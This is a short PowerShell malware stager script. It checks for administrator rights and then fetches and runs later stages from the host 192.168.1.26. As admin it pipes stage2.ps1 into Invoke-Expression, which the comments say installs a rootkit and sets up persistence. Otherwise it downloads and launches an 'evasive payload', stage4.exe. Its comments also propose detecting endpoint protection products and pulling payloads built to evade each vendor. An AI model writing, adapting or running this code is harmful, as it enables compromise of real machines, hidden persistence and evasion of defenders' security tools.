# Check if the current user is an administrator
# stage3.exe is your rootkit installer
# stage4.exe is the evasive payload
# You can easily add more logic to enumerate endpoint protection agent installations and pull a different payload designed to evade that vendor solution.
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
$isAdministrator = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdministrator) {
# Chain IEX commands together, stage2 will abuse it's administrative privileges to install a rootkit, configure it, and then persist the payload as a privileged user.
    iwr -Uri 'http://192.168.1.26/stage2.ps1' | & Invoke-Expression
} else {
    # Execute the payload anyways as a nonprivileged user vector
    iwr -Uri 'http://192.168.1.26/stage4.exe' -OutFile 'stage4.exe';
    $currentPath = Get-Location
    $executable = "stage4.exe"
    Start-Process -FilePath "$currentPath\$executable" -NoNewWindow -PassThru | Out-Null
    Start-Sleep -Seconds 5
}
